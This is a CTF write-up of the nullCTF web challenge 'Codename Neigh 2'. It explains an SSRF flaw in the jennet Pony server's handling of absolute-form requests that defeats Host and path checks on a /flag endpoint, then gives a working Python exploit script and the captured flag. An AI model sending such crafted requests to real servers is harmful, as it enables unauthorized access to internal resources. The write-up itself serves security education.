#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Codename Neigh 2",
    description: "Exploit writeup for 'Codename Neigh 2', a web challenge from nullCTF",
    date: "2025-12-09",
    order: 16,
  ),
)<frontmatter>
= Codename Neigh 2 Exploit Analysis

== Vulnerability Analysis

The "Codename Neigh 2" application is vulnerable to a Server-Side Request Forgery (SSRF) vulnerability. This vulnerability is caused by the `jennet` web server library's handling of absolute-form HTTP requests.

When the server receives a request with the URL in absolute form (e.g., `GET http://example.com/path HTTP/1.1`), it acts as a proxy and makes a new request to the specified URL. This behavior can be abused to make the server send requests to internal resources, such as `127.0.0.1`.

The `/flag` endpoint, handled by the `F` class in `app/main.pony`, has two checks that need to be bypassed:
1. The `Host` header of the request must be `127.0.0.1`.
2. The request path must not start with `flag` or `/flag`.

=== 1. The Vulnerable Code

The `apply` method of the `F` class contains the following logic:

```pony
  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()

    try
      conn = ctx.request.header("Host") as String
    end

    let path: String = ctx.request.uri().string()

    if (conn == "127.0.0.1") and not_starts_with(path, "flag") and not_starts_with(path, "/flag") then
      let fpath = FilePath(_fileauth, "private/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx
```

== The Exploitation Strategy

The exploit involves sending a crafted absolute-form request to the server.

=== Step 1: Crafting the SSRF Payload

We can craft an HTTP request with the following request line:
`GET http://127.0.0.1/flag HTTP/1.1`

When the `jennet` server receives this request, it will make a new request to `http://127.0.0.1/flag`.

=== Step 2: Bypassing the Checks

This new, internal request bypasses both checks in the `F` class:
1. **Host Check:** The request originates from the server itself, so the `Host` header will be `127.0.0.1`.
2. **Path Check:** The `jennet` library appears to set the `path` variable to the full URL (`http://127.0.0.1/flag`). Since this string does not start with `flag` or `/flag`, the check is bypassed.

== The Exploit

The following Python script can be used to exploit the vulnerability:

```python
import socket

HOST = "public.ctf.r0devnull.team"   # hostname ONLY
PORT = 3003                          # challenge port

req = (
    "GET http://127.0.0.1/flag HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Connection: close\r\n"
    "\r\n"
)

s = socket.create_connection((HOST, PORT))
s.sendall(req.encode())
resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
s.close()

print(resp.decode(errors="replace"))
```

== Flag
```
nullctf{n0w_w!th_99%_l3ss_un1nt3nd3d_s0lv3s_m4yb3!!!@}
```
